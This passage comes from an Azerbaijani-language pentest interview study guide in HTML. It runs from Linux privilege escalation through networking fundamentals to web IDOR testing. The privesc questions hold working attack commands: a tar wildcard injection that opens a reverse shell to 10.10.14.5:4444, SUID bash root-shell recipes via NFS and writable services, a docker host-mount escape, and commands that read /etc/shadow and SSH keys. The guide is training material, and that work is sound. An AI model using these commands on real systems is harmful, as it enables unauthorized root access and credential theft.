+<div class="qa-q"><span class="badge">Sual 27</span><h3>Kernel exploit-ləri (Dirty COW, Dirty Pipe, PwnKit) hansılardır?</h3></div>
+<div class="qa-a">
+<p>Kernel köhnə/yamaqsızdırsa, lokal kernel exploit ilə birbaşa root alına bilər. İlk addım: <code>uname -a</code> + linux-exploit-suggester.</p>
+<ul class="blist">
+<li>CVE-2016-5195 (Dirty COW) – copy-on-write race; read-only faylı yazmaq → root.</li>
+<li>CVE-2022-0847 (Dirty Pipe) – pipe buffer ilə read-only fayllara yazma (kernel 5.8+).</li>
+<li>CVE-2021-4034 (PwnKit) – polkit pkexec, demək olar bütün dağıtımlarda root.</li>
+<li>CVE-2021-3493 (OverlayFS) – Ubuntu lokal privesc.</li>
+<li>CVE-2017-1000112 / 5618 – köhnə kernel-lər üçün məşhur exploit-lər.</li>
+</ul>
+<p>Diqqət: kernel exploit-ləri sistemi crash edə bilər; CTF-də son çarə kimi istifadə olunur.</p>
+</div></article>
+<article class="qa" id="q28">
+<div class="qa-q"><span class="badge">Sual 28</span><h3>NFS no_root_squash ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p><code>/etc/exports</code>-da <strong>no_root_squash</strong> varsa, remote root NFS share-də root kimi fayl yarada bilir. Hücumçu öz maşınında root olub SUID binari yaradır, qurban onu işə salır.</p>
+<pre class="code"><code>showmount -e TARGET            # export-ları gör
+mount -o rw TARGET:/share /mnt # hücumçu maşınında (root)
+cp /bin/bash /mnt/rootbash
+chmod +s /mnt/rootbash
+# qurban maşınında:
+/share/rootbash -p             # root shell</code></pre>
+</div></article>
+<article class="qa" id="q29">
+<div class="qa-q"><span class="badge">Sual 29</span><h3>Docker, LXD və disk qrupu ilə privesc necədir?</h3></div>
+<div class="qa-a">
+<p>Müəyyən qruplara üzvlük effektiv olaraq root hüququ verir (<code>id</code> ilə yoxla).</p>
+<ul class="blist">
+<li><strong>docker qrupu</strong> – host fayl sistemini konteynerə mount edib root almaq.</li>
+<li><strong>lxd/lxc qrupu</strong> – privileged konteyner yaradıb host diskini mount etmək.</li>
+<li><strong>disk qrupu</strong> – <code>debugfs</code> ilə raw disk oxu/yaz (/etc/shadow).</li>
+</ul>
+<pre class="code"><code># docker qrupu:
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# disk qrupu:
+debugfs /dev/sda1 -R 'cat /etc/shadow'</code></pre>
+</div></article>
+<article class="qa" id="q30">
+<div class="qa-q"><span class="badge">Sual 30</span><h3>Wildcard injection (tar, chown, rsync) nədir?</h3></div>
+<div class="qa-a">
+<p>Root script-i <code>*</code> (wildcard) ilə əmr işlədirsə, qovluqda fayl adı kimi yaradılmış “arqumentlər” əmrə ötürülür və davranışı dəyişir.</p>
+<pre class="code"><code># tar wildcard injection (cron 'tar czf bak.tar.gz *' işlədir):
+echo 'bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1"' &gt; shell.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'</code></pre>
+<p>Eyni məntiq <code>chown</code>, <code>chmod</code>, <code>rsync</code> üçün də (<code>--reference</code>, <code>-e</code> kimi opsiyalarla) işləyir.</p>
+</div></article>
+<article class="qa" id="q31">
+<div class="qa-q"><span class="badge">Sual 31</span><h3>Yazıla bilən systemd service / service faylı ilə privesc?</h3></div>
+<div class="qa-a">
+<p>Root kimi işləyən servisin <strong>.service</strong> faylı və ya onun işə saldığı <strong>binari/script</strong> yazıla bilirsə, kod inject edib servisi restart etməklə root alınır.</p>
+<pre class="code"><code>systemctl list-units --type=service
+ls -la /etc/systemd/system/        # writable .service axtar
+# binari writable olduqda:
+echo -e '#!/bin/bash\ncp /bin/bash /tmp/rb; chmod +s /tmp/rb' &gt; /path/svc-bin
+sudo systemctl restart vuln.service   # (restart hüququ varsa)
+/tmp/rb -p</code></pre>
+</div></article>
+<article class="qa" id="q32">
+<div class="qa-q"><span class="badge">Sual 32</span><h3>Credential harvesting və həssas fayllar harada axtarılır?</h3></div>
+<div class="qa-a">
+<p>Privesc həmişə exploit deyil — çox vaxt sistemdə açıq saxlanan parol/açar kifayətdir.</p>
+<ul class="blist">
+<li>History – <code>~/.bash_history</code>, <code>.zsh_history</code>, <code>.mysql_history</code>.</li>
+<li>Config – <code>wp-config.php</code>, <code>.env</code>, <code>config.php</code>, <code>settings.py</code> (DB parolları).</li>
+<li>SSH açarları – <code>~/.ssh/id_rsa</code>, <code>authorized_keys</code>.</li>
+<li>Backup-lar – <code>*.bak</code>, <code>/var/backups</code>, <code>.git</code> qovluğu.</li>
+<li>Yazılı paroldan istifadə – reuse: başqa user/root üçün eyni parolu sına.</li>
+</ul>
+<pre class="code"><code>grep -ri 'password' /var/www 2&gt;/dev/null
+find / -name 'id_rsa' 2&gt;/dev/null
+cat ~/.bash_history</code></pre>
+</div></article>
+<article class="qa" id="q33">
+<div class="qa-q"><span class="badge">Sual 33</span><h3>Linux privesc — ümumi attack chain və alətlər xülasəsi</h3></div>
+<div class="qa-a">
+<h4 class="sub">İş axını</h4>
+<ul class="blist">
+<li>1. Stabil shell al (TTY upgrade: <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>).</li>
+<li>2. Avtomatik enum işlət (LinPEAS) + manual yoxlama (sudo -l, SUID, cron, caps).</li>
+<li>3. Asan qələbələri yoxla: sudo -l, GTFOBins, açıq cred-lər.</li>
+<li>4. Konfiqurasiya səhvləri: cron, PATH, writable fayllar, NFS, qruplar.</li>
+<li>5. Son çarə: uyğun kernel exploit.</li>
+<li>6. Root alındıqdan sonra persistence + təmizlik (lab/icazəli mühitdə).</li>
+</ul>
+<h4 class="sub">Əsas alətlər</h4>
+<ul class="blist">
+<li>Enum: LinPEAS, LinEnum, lse.sh, pspy.</li>
+<li>Exploit suggest: linux-exploit-suggester, Watson (linux portu yox — bu Windows üçündür).</li>
+<li>Crack: John the Ripper, Hashcat.</li>
+<li>Reference: GTFOBins, HackTricks (yalnız istinad/öyrənmə üçün).</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat4">
+<header class="cat-head"><span class="cat-head-num">04</span><h2>Şəbəkə (Networking)</h2></header>
+<article class="qa" id="q34">
+<div class="qa-q"><span class="badge">Sual 34</span><h3>Router nədir və hansı layer-də işləyir?</h3></div>
+<div class="qa-a">
+<p>Router – şəbəkədə məlumat paketlərini düzgün istiqamətə yönləndirən cihazdır (paketlərin haraya getməli olduğunu qərar verən “poçt ofisi” kimi).</p>
+<ul class="blist">
+<li>İnternet/LAN arasında trafik yönləndirir.</li>
+<li>Routing table istifadə edərək doğru çıxışı seçir.</li>
+<li>Bəzən firewall, NAT, DHCP funksiyaları təmin edir.</li>
+</ul>
+<p>Router OSI modelində Layer 3-də (Network) işləyir – IP ünvanlara baxır. Switch isə Layer 2-də işləyir – MAC ünvanlara baxır.</p>
+</div></article>
+<article class="qa" id="q35">
+<div class="qa-q"><span class="badge">Sual 35</span><h3>Modem və Switch nədir?</h3></div>
+<div class="qa-a">
+<p>Modem (modulator-demodulator) – internet provayderindən gələn siqnalı ev/lokal şəbəkədə istifadə oluna biləcək formaya çevirən cihazdır. Modulator digital siqnalı xəttə göndərir, demodulator gələn siqnalı digital formaya çevirir.</p>
+<p>Switch – LAN içində cihazlar arasında paketləri yönləndirən cihazdır (şəbəkənin mərkəzi paylayıcısı). Hər cihazın MAC ünvanını tanıyır və paketləri düzgün porta göndərir.</p>
+</div></article>
+<article class="qa" id="q36">
+<div class="qa-q"><span class="badge">Sual 36</span><h3>Şəbəkə protokolu nədir və OSI modelinin 7 layeri hansılardır?</h3></div>
+<div class="qa-a">
+<p>Şəbəkə protokolu – şəbəkədə cihazların bir-biri ilə danışması üçün razılaşdıqları qaydalar və standartlar toplusudur.</p>
+<p>OSI (Open Systems Interconnection) modeli kommunikasiya prosesini 7 təbəqəyə bölür:</p>
+<ul class="blist">
+<li>7 – Application: istifadəçi ilə şəbəkə interfeysi (HTTP, HTTPS, FTP, SMTP, DNS, Telnet).</li>
+<li>6 – Presentation: formatlama, şifrələmə, kodlaşdırma (SSL/TLS, JPEG, MPEG, ASCII).</li>
+<li>5 – Session: sessiya idarəsi (NetBIOS, PPTP, RPC).</li>
+<li>4 – Transport: paketlərin çatdırılması (TCP, UDP, SCTP).</li>
+<li>3 – Network: marşrutlaşdırma, IP ünvanlama (IP, ICMP, IGMP, IPsec).</li>
+<li>2 – Data Link: MAC ünvanları, fiziki cihazlar arası ötürmə (Ethernet, ARP, PPP).</li>
+<li>1 – Physical: fiziki ötürmə, siqnallar, kabel (Ethernet kabeli, Fiber, Wi-Fi).</li>
+</ul>
+</div></article>
+<article class="qa" id="q37">
+<div class="qa-q"><span class="badge">Sual 37</span><h3>Fayl göndərmə prosesi OSI ilə necə baş verir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Application (7) – proqram (FTP/HTTP) faylı data şəklində hazırlayır.</li>
+<li>Presentation (6) – data şifrələnir/kodlaşdırılır (encoded data).</li>
+<li>Session (5) – cihazlar arasında sessiya yaradılır və saxlanılır.</li>
+<li>Transport (4) – data seqmentlərə bölünür; TCP-də seq nömrəsi, port, checksum əlavə olunur.</li>
+<li>Network (3) – IP header əlavə olunur (mənbə/target IP), paket formalaşır; router burada işləyir.</li>
+<li>Data Link (2) – Ethernet header/trailer (MAC, CRC) əlavə olunur, frame yaranır.</li>
+<li>Physical (1) – siqnallar kabel/Wi-Fi/fiber üzərindən göndərilir.</li>
+</ul>
+</div></article>
+<article class="qa" id="q38">
+<div class="qa-q"><span class="badge">Sual 38</span><h3>TCP/IP modelinin 4 layeri hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Application (OSI 7+6+5) – istifadəçi proqramları ilə şəbəkə interfeysi (HTTP, HTTPS, FTP, SMTP, DNS).</li>
+<li>Transport (OSI 4) – segmentləri göndərir, etibarlı/sürətli ötürmə (TCP, UDP).</li>
+<li>Internet (OSI 3) – marşrutlaşdırma, IP ünvanlama (IP, ICMP, IGMP).</li>
+<li>Network Access / Link (OSI 2+1) – fiziki ötürmə, MAC ünvanları (Ethernet, Wi-Fi, ARP, DSL).</li>
+</ul>
+</div></article>
+<article class="qa" id="q39">
+<div class="qa-q"><span class="badge">Sual 39</span><h3>Hər OSI layer-də tipik hücum hansıdır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Layer 7 (Application): SQL Injection (məs: &#x27; OR 1=1--).</li>
+<li>Layer 6 (Presentation): SSL/TLS Downgrade (POODLE, BEAST).</li>
+<li>Layer 5 (Session): Session Hijacking (cookie oğurluğu).</li>
+<li>Layer 4 (Transport): SYN Flood (TCP handshake abuse).</li>
+<li>Layer 3 (Network): IP Spoofing (DoS, MITM).</li>
+<li>Layer 2 (Data Link): ARP Spoofing / Poisoning (LAN MITM).</li>
+<li>Layer 1 (Physical): Cable Tapping / fiziki giriş.</li>
+</ul>
+</div></article>
+<article class="qa" id="q40">
+<div class="qa-q"><span class="badge">Sual 40</span><h3>IPv4 və IPv6 nədir, fərqləri nələrdir?</h3></div>
+<div class="qa-a">
+<p>IPv4 – internetdə ən çox istifadə olunan protokoldur. 32-bit ünvan (~4.3 milyard IP), dörd oktetli desimal format (192.168.1.1).</p>
+<p>IPv6 – IPv4 çatışmazlığı üçün hazırlanıb. 128-bit ünvan (~3.4×10^38), heksadesimal + kolon format (2001:0db8:85a3::8a2e:0370:7334).</p>
+<ul class="blist">
+<li>Bit uzunluğu: IPv4 32-bit, IPv6 128-bit.</li>
+<li>Format: IPv4 decimal, IPv6 heksadesimal.</li>
+<li>Ünvan sayı: IPv4 ~4 milyard, IPv6 3.4×10^38.</li>
+<li>Security: IPv4 opsional IPsec, IPv6 default IPsec.</li>
+<li>NAT: IPv4 lazımdır, IPv6 adətən lazım deyil.</li>
+</ul>
+</div></article>
+<article class="qa" id="q41">
+<div class="qa-q"><span class="badge">Sual 41</span><h3>Network address, broadcast address və istifadə oluna bilən IP-lər nədir?</h3></div>
+<div class="qa-a">
+<p>Bir /24 şəbəkə üçün:</p>
+<ul class="blist">
+<li>192.168.1.0 – Network address (şəbəkənin özü, cihaza verilə BİLMƏZ).</li>
+<li>192.168.1.255 – Broadcast address (bütün şəbəkəyə mesaj, cihaza verilə BİLMƏZ).</li>
+<li>192.168.1.1 → 192.168.1.254 – istifadə oluna bilən IP-lər.</li>
+</ul>
+</div></article>
+<article class="qa" id="q42">
+<div class="qa-q"><span class="badge">Sual 42</span><h3>LAN, WAN, PAN, MAN nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>LAN (Local Area Network) – kiçik ərazi (ev, ofis, məktəb); yüksək sürət (100 Mbps–10 Gbps); kompüter, printer, router, switch.</li>
+<li>WAN (Wide Area Network) – böyük ərazi (şəhər, ölkə, qitə); LAN-ları bağlayır; internet də WAN-dir.</li>
+<li>PAN (Personal Area Network) – çox kiçik (1–10 m); şəxsi istifadə (Bluetooth qulaqlıq, smart saat).</li>
+<li>MAN (Metropolitan Area Network) – şəhər ərazisi; LAN-ları şəhər daxilində birləşdirir.</li>
+</ul>
+</div></article>
+<article class="qa" id="q43">
+<div class="qa-q"><span class="badge">Sual 43</span><h3>Private və Public IP aralıqları hansılardır?</h3></div>
+<div class="qa-a">
+<p>Private IP – internetdə rout olunmur, yalnız LAN daxilində işləyir (RFC 1918):</p>
+<ul class="blist">
+<li>Class A: 10.0.0.0/8 (~16 milyon host) – böyük şirkətlər, data center.</li>
+<li>Class B: 172.16.0.0/12 (~1 milyon host) – orta enterprise şəbəkələr.</li>
+<li>Class C: 192.168.0.0/16 (65,534 host) – ev, ofis, router-lər.</li>
+</ul>
+<p>Public IP – internetdə rout olunur, ISP verir; private olmayan bütün IP-lər public sayılır.</p>
+<ul class="blist">
+<li>Class A Public: 1.0.0.0 – 126.255.255.255 (127.0.0.0/8 = loopback).</li>
+<li>Class B Public: 128.0.0.0 – 191.255.255.255.</li>
+<li>Class C Public: 192.0.0.0 – 223.255.255.255.</li>
+<li>Class D: 224.0.0.0 – 239.255.255.255 (Multicast).</li>
+<li>Class E: 240.0.0.0 – 255.255.255.255 (Experimental).</li>
+</ul>
+<p>Qızıl qayda: Private IP-lər NAT olmadan internetə çıxa bilməz, Public IP-lər isə birbaşa rout olunur.</p>
+</div></article>
+<article class="qa" id="q44">
+<div class="qa-q"><span class="badge">Sual 44</span><h3>IP class-ları və default subnet mask-ları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Class A: 1–126 (0–127), default mask 255.0.0.0 (/8).</li>
+<li>Class B: 128–191, default mask 255.255.0.0 (/16).</li>
+<li>Class C: 192–223, default mask 255.255.255.0 (/24).</li>
+<li>Class D: 224–239 (Multicast), host IP kimi istifadə olunmur.</li>
+<li>Class E: 240–255 (Experimental), test/research üçün.</li>
+</ul>
+</div></article>
+<article class="qa" id="q45">
+<div class="qa-q"><span class="badge">Sual 45</span><h3>Host sayı necə hesablanır və əsas CIDR-lər hansılardır?</h3></div>
+<div class="qa-a">
+<p>Formula: Host sayı = 2^(32 - CIDR) - 2.</p>
+<ul class="blist">
+<li>/8 → 255.0.0.0 → 16,777,214 host.</li>
+<li>/16 → 255.255.0.0 → 65,534 host.</li>
+<li>/24 → 255.255.255.0 → 254 host.</li>
+<li>/26 → 255.255.255.192 → 62 host.</li>
+<li>/30 → 255.255.255.252 → 2 host (point-to-point).</li>
+</ul>
+</div></article>
+<article class="qa" id="q46">
+<div class="qa-q"><span class="badge">Sual 46</span><h3>İki IP eyni şəbəkədə sayılması üçün hansı şərtlər lazımdır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>Subnet mask eyni olmalıdır (məs: hər ikisi /24).</li>
+<li>Subnet mask tətbiq edildikdə network address eyni alınmalıdır.</li>
+<li>IP-lər usable host olmalıdır (network və broadcast address olmamalıdır).</li>
+</ul>
+</div></article>
+<article class="qa" id="q47">
+<div class="qa-q"><span class="badge">Sual 47</span><h3>Subnet Mask nədir?</h3></div>
+<div class="qa-a">
+<p>Subnet mask – IP ünvanının hansı hissəsinin network, hansı hissəsinin host olduğunu göstərən 32-bit dəyərdir. Router və cihazlar bu maskaya baxaraq paketlərin doğru şəbəkəyə gedib-getməyəcəyinə qərar verir.</p>
+</div></article>
+<article class="qa" id="q48">
+<div class="qa-q"><span class="badge">Sual 48</span><h3>DHCP nədir və workflow-u necədir?</h3></div>
+<div class="qa-a">
+<p>DHCP (Dynamic Host Configuration Protocol) – şəbəkədə cihazlara avtomatik IP ünvanı, subnet mask, gateway, DNS server və digər parametrləri verən protokoldur. Ev/ofis şəbəkələrində router adətən DHCP server rolundadır.</p>
+<h4 class="sub">Workflow (D-O-R-A)</h4>
+<ul class="blist">
+<li>DHCP Discover – client şəbəkədə DHCP server axtarır.</li>
+<li>DHCP Offer – server IP və parametrləri təklif edir.</li>
+<li>DHCP Request – client təklifi qəbul edir.</li>
+<li>DHCP Acknowledge (ACK) – server təsdiqləyir, IP aktiv olur.</li>
+</ul>
+<p>DHCP portları: Client→Server 67/UDP, Server→Client 68/UDP. DHCP Application Layer-də işləyir, Transport-da UDP istifadə edir.</p>
+</div></article>
+<article class="qa" id="q49">
+<div class="qa-q"><span class="badge">Sual 49</span><h3>Default Gateway nədir?</h3></div>
+<div class="qa-a">
+<p>Default Gateway – şəbəkədəki cihazın öz şəbəkəsindən çıxıb digər şəbəkələrə (məs: internet) gedərkən istifadə etdiyi “çıxış qapısı”dır. Sadə dillə: LAN-dan kənara çıxmaq üçün istifadə olunan router.</p>
+</div></article>
+<article class="qa" id="q50">
+<div class="qa-q"><span class="badge">Sual 50</span><h3>NAT nədir və növləri hansılardır?</h3></div>
+<div class="qa-a">
+<p>NAT (Network Address Translation) – iç şəbəkədəki private IP-ləri internetdə rout olunan public IP-lərə çevirən texnologiyadır (ev/ofis router-lərində standartdır).</p>
+<p>Necə işləyir: cihaz internetə paket göndərir, router private IP-ni public IP-yə çevirir, gələn cavabı isə geri private IP-yə çevirir.</p>
+<h4 class="sub">Növləri</h4>
+<ul class="blist">
+<li>Static NAT – hər private IP üçün 1 public IP sabit təyin olunur (1-1, daimi mapping).</li>
+<li>Dynamic NAT – private IP public IP pool-dan seçilir; pool bitərsə yeni IP çıxa bilmir.</li>
+<li>PAT / NAT overload – 1 public IP → çox private IP (port nömrəsi ilə).</li>
+</ul>
+</div></article>
+<article class="qa" id="q51">
+<div class="qa-q"><span class="badge">Sual 51</span><h3>APIPA nədir və IP-lər niyə üst-üstə düşmür?</h3></div>
+<div class="qa-a">
+<p>APIPA (Automatic Private IP Addressing) range: 169.254.0.0 – 169.254.255.255 (real istifadə: 169.254.1.0 – 169.254.254.255). DHCP işləməyəndə cihaz özü-özünə bu range-dən IP seçir.</p>
+<p>Necə seçir (ARP Probe / Conflict Detection):</p>
+<ul class="blist">
+<li>Cihaz təsadüfi IP seçir (məs: 169.254.23.77).</li>
+<li>Şəbəkəyə ARP sorğusu göndərir: “Bu IP kimdə var?”</li>
+<li>Cavab gəlməzsə → IP boşdur, cihaz onu götürür.</li>
+<li>Cavab gələrsə → IP istifadədədir, cihaz başqa IP seçir.</li>
+</ul>
+<p>Static IP-də isə avtomatika yoxdur – insan təyin edir, sistem default halda yoxlamır. İki eyni static IP IP conflict yaradar. Düzgün: static IP DHCP pool-dan kənarda verilməlidir.</p>
+</div></article>
+<article class="qa" id="q52">
+<div class="qa-q"><span class="badge">Sual 52</span><h3>ICMP nədir?</h3></div>
+<div class="qa-a">
+<p>ICMP (Internet Control Message Protocol) – şəbəkədə xəta bildirişi və diaqnostika üçün istifadə olunan protokoldur (“şəbəkə danışır, amma data daşımır”). IP protokolunun içində işləyir, TCP/UDP kimi data ötürmür.</p>
+<h4 class="sub">Ən məşhur mesajları</h4>
+<ul class="blist">
+<li>Echo Request / Echo Reply → ping.</li>
+<li>Destination Unreachable → hədəf əlçatan deyil.</li>
+<li>Time Exceeded → paket yolda vaxtı keçdi (traceroute).</li>
+<li>Redirect → daha yaxşı marşrut var.</li>
+</ul>
+<p>Təhlükəsizlik: pentest zamanı host discovery üçün istifadə olunur, bəzi firewall-lar bloklayır, ICMP Flood → DoS hücumu ola bilər.</p>
+</div></article>
+<article class="qa" id="q53">
+<div class="qa-q"><span class="badge">Sual 53</span><h3>ARP nədir və necə işləyir?</h3></div>
+<div class="qa-a">
+<p>ARP (Address Resolution Protocol) – IP ünvanını MAC ünvana çevirən protokoldur (“IP-ni tanıyıram, amma paketi göndərmək üçün MAC lazımdır”).</p>
+<ul class="blist">
+<li>ARP Request (Broadcast): “Kimdə var 192.168.1.20?” – Destination MAC FF:FF:FF:FF:FF:FF, bütün LAN görür.</li>
+<li>ARP Reply (Unicast): hədəf cihaz öz MAC-ını birbaşa cavab verir.</li>
+<li>ARP Cache (Table): nəticə yadda saxlanır, müəyyən vaxtdan sonra silinir (timeout).</li>
+</ul>
+</div></article>
+<article class="qa" id="q54">
+<div class="qa-q"><span class="badge">Sual 54</span><h3>Əsas Application Layer protokolları və portları hansılardır?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>HTTP 80 / HTTPS 443 (TCP) – web.</li>
+<li>FTP 21 (control), 20 (data) / FTPS 990 / SFTP 22 (TCP).</li>
+<li>SSH 22, Telnet 23 (TCP).</li>
+<li>SMTP 25, SMTPS 465/587, POP3 110, POP3S 995, IMAP 143, IMAPS 993 (TCP).</li>
+<li>DNS 53 (UDP/TCP), DHCP 67/68 (UDP).</li>
+<li>SNMP 161/162 (UDP), NTP 123 (UDP).</li>
+<li>LDAP 389, LDAPS 636.</li>
+<li>SMB 445, NetBIOS 137–139, RDP 3389, VNC 5900 (TCP).</li>
+<li>SIP 5060/5061 (VoIP), TFTP 69 (UDP), NFS 2049 (TCP).</li>
+</ul>
+<p>Portsuz/xüsusi: ICMP (Layer 3), ARP (Layer 2), IPSec/IKE 500/4500, GRE (Layer 3).</p>
+</div></article>
+<article class="qa" id="q55">
+<div class="qa-q"><span class="badge">Sual 55</span><h3>DNS nədir, hansı serverlər və record-lar var?</h3></div>
+<div class="qa-a">
+<p>DNS (Domain Name System) – domain adlarını IP ünvanlarına çevirən sistemdir (internetin telefon kitabçası).</p>
+<h4 class="sub">Serverlər</h4>
+<ul class="blist">
+<li>Recursive Resolver – ISP/router-də olur, client adından bütün sorğunu edir.</li>
+<li>Root DNS Server – ən yuxarı; TLD-nin kimdə olduğunu deyir (IP vermir, yol göstərir).</li>
+<li>TLD Server – .com, .org, .az üçün cavabdeh; authoritative serveri göstərir.</li>
+<li>Authoritative DNS Server – əsl cavab; domain-in real IP-si buradan gəlir.</li>
+</ul>
+<h4 class="sub">Əsas record-lar</h4>
+<ul class="blist">
+<li>A – domain → IPv4.</li>
+<li>AAAA – domain → IPv6.</li>
+<li>CNAME – bir domain-i başqa domain-ə yönləndirir (alias, IP saxlamır).</li>
+<li>MX – mail server-i göstərir.</li>
+</ul>
+</div></article>
+<article class="qa" id="q56">
+<div class="qa-q"><span class="badge">Sual 56</span><h3>SFTP, FTPS və TFTP arasında fərq nədir?</h3></div>
+<div class="qa-a">
+<p>Qısa: SFTP = SSH üzərindən fayl ötürülməsi; FTPS = FTP + SSL/TLS şifrələmə. Adları oxşardır, texnologiyaları fərqlidir.</p>
+<ul class="blist">
+<li>SFTP (SSH File Transfer Protocol) – SSH-ın bir hissəsi, FTP ilə əlaqəsi yoxdur, tək port (22/TCP), tam şifrəli, firewall-dan rahat keçir.</li>
+<li>FTPS (FTP Secure) – klassik FTP-nin SSL/TLS versiyası. Explicit FTPS: port 21; Implicit FTPS: port 990.</li>
+<li>TFTP (Trivial File Transfer Protocol) – çox sadə, yüngül, təhlükəsizliyi demək olar yoxdur; UDP, port 69.</li>
+</ul>
+</div></article>
+<article class="qa" id="q57">
+<div class="qa-q"><span class="badge">Sual 57</span><h3>SMTP, POP3 və IMAP nədir?</h3></div>
+<div class="qa-a">
+<p>SMTP (Simple Mail Transfer Protocol) – elektron poçt göndərmək üçündür. TCP; portlar 25, 587, 465; Application Layer; TLS/SSL (STARTTLS) mümkün; auth username/password və ya OAuth2.</p>
+<p>POP3 (Post Office Protocol v3) – mail almaq üçün. Port 110 (plain) / 995 (SSL). Mail-i serverdən download edib silir (default); bir cihaz üçün uyğundur.</p>
+<p>IMAP (Internet Message Access Protocol) – mail almaq üçün. Port 143 (plain) / 993 (SSL). Mail-i serverdə saxlayır; birdən çox cihaz üçün idealdır.</p>
+</div></article>
+<article class="qa" id="q58">
+<div class="qa-q"><span class="badge">Sual 58</span><h3>HTTP, HTTPS, SSL və TLS nədir?</h3></div>
+<div class="qa-a">
+<p>HTTP (HyperText Transfer Protocol) – web səhifələrin ötürülməsi üçündür. Şifrələmə yoxdur (plain text, sniff edilə bilər). Port TCP 80, Layer 7.</p>
+<p>HTTPS (HTTP Secure) – HTTP + TLS/SSL şifrələmə. Data şifrəlidir, Integrity + Authentication var, MITM-ə qarşı qoruyur. Port TCP 443.</p>
+<p>SSL (Secure Sockets Layer) – köhnə şifrələmə protokolu. TLS (Transport Layer Security) – SSL-in modern versiyası.</p>
+<ul class="blist">
+<li>SSL versiya: 2.0/3.0 (köhnə); TLS: 1.0 → 1.3 (modern).</li>
+<li>Təhlükəsizlik: SSL zəif/exploit-ə açıq; TLS güclü, standart.</li>
+<li>İstifadə: SSL demək olar bitib; TLS HTTPS, SMTP, FTPS, IMAP, POP3, VPN-də.</li>
+</ul>
+</div></article>
+<article class="qa" id="q59">
+<div class="qa-q"><span class="badge">Sual 59</span><h3>VPN nədir və tunneling protokolları hansılardır?</h3></div>
+<div class="qa-a">
+<p>VPN (Virtual Private Network) – ictimai şəbəkə (internet) üzərindən secure və private bağlantı təmin edən texnologiyadır.</p>
+<h4 class="sub">Tunneling protokolları</h4>
+<ul class="blist">
+<li>PPTP – köhnə, TCP 1723, MSCHAPv2; təhlükəsizliyi zəif.</li>
+<li>L2TP – UDP 1701, şifrələmə yoxdur, adətən IPSec ilə birləşdirilir.</li>
+<li>GRE – Cisco və digər router-lər üçün tunnel, şifrələmə yoxdur.</li>
+<li>OpenVPN – SSL/TLS üzərindən TCP/UDP, secure, firewall-friendly.</li>
+<li>WireGuard – modern, lightweight, UDP-based, sürətli və təhlükəsiz.</li>
+<li>IPSec – Layer 3 encryption, site-to-site və remote access.</li>
+</ul>
+</div></article>
+<article class="qa" id="q60">
+<div class="qa-q"><span class="badge">Sual 60</span><h3>Proxy nədir?</h3></div>
+<div class="qa-a">
+<p>Proxy – müştəri ilə server arasında aralıq agent/vasitəçi olan serverdir (Client → Proxy → Target). IP ünvanı maskalanır (server target IP-ni görmür). Əsas məqsəd: anonimlik, caching, content filter. Layer 7-də işləyir; HTTP Proxy-də adətən şifrələmə yoxdur.</p>
+</div></article>
+<article class="qa" id="q61">
+<div class="qa-q"><span class="badge">Sual 61</span><h3>OSPF, RIP, BGP və STP routing protokolları nədir?</h3></div>
+<div class="qa-a">
+<ul class="blist">
+<li>OSPF (Open Shortest Path First) – Layer 3, Link-state; LSA paketləri ilə ən qısa yol tapır; IP protokol 89; enterprise/ISP internal routing.</li>
+<li>RIP (Routing Information Protocol) – Layer 3, Distance-vector; hop count əsaslı, max 15 hop; UDP 520; kiçik/orta şəbəkələr.</li>
+<li>BGP (Border Gateway Protocol) – Layer 3, Path-vector; Autonomous System-lər arası internet routing; TCP 179; ISP-lər, internet backbone, policy-based routing.</li>
+<li>STP (Spanning Tree Protocol) – Layer 2, loop-prevention; switch-lərdə loop-ları önləyir, root bridge seçir, redundant link-ləri block edir.</li>
+</ul>
+</div></article>
+</section>
+<section class="cat-section" id="cat5">
+<header class="cat-head"><span class="cat-head-num">05</span><h2>Veb Pentest</h2></header>
+<article class="qa" id="q62">
+<div class="qa-q"><span class="badge">Sual 62</span><h3>Broken Access Control və IDOR nədir, fərqi nədir?</h3></div>
+<div class="qa-a">
+<p>Broken Access Control – ümumi təhlükəsizlik problemi kateqoriyasıdır: sistem istifadəçilərə hansı resursa daxil ola biləcəyini düzgün yoxlamır (kim nəyi görə/edə bilər düzgün idarə olunmur).</p>
+<p>IDOR (Insecure Direct Object Reference) – Broken Access Control-un bir növüdür: istifadəçi URL və ya ID dəyişərək başqasının məlumatına girə bilir (məs: /profile?id=123 → /profile?id=124).</p>
+<ul class="blist">
+<li>Broken Access Control = “Kim nə edə bilər?” düzgün yoxlanmır (geniş kateqoriya).</li>
+<li>IDOR = “ID dəyişdim və başqasının məlumatına girdim” (spesifik növ).</li>
+</ul>
+</div></article>
+<article class="qa" id="q63">
+<div class="qa-q"><span class="badge">Sual 63</span><h3>IDOR harada axtarılır və necə test edilir?</h3></div>
+<div class="qa-a">
+<h4 class="sub">Harada olur?</h4>
+<ul class="blist">
+<li>URL parametrlərində (?id=, ?user=, ?order_id=).</li>
+<li>API endpoint-lərdə (GET /api/users/123).</li>
+<li>Form submission / POST body-də.</li>
+<li>Hidden field-lərdə.</li>
+<li>File access (/download?file=invoice_123.pdf).</li>
+<li>JWT / Token içində.</li>
+<li>Multi-step proseslərdə və admin panellərdə.</li>
+</ul>
+<h4 class="sub">Necə test edilir?</h4>
+<ul class="blist">
+<li>İki user yarat (A və B) – müqayisə üçün.</li>
+<li>Trafiki proxy (Burp) ilə tut, login ol.</li>
+<li>Maraqlı request tap (profil, order, mesaj), ID-ni tap.</li>
+<li>Request-i Repeater-ə göndər, ID-ni dəyiş (101 → 102).</li>
+<li>Response-u analiz et: 403/401 → secure; başqa userin datası gəlirsə → IDOR.</li>
+</ul>
+<p>Qızıl qayda: Heç vaxt yalnız ID-yə güvənmə – hər request-də access yoxla.</p>
+</div></article>
+<article class="qa" id="q64">
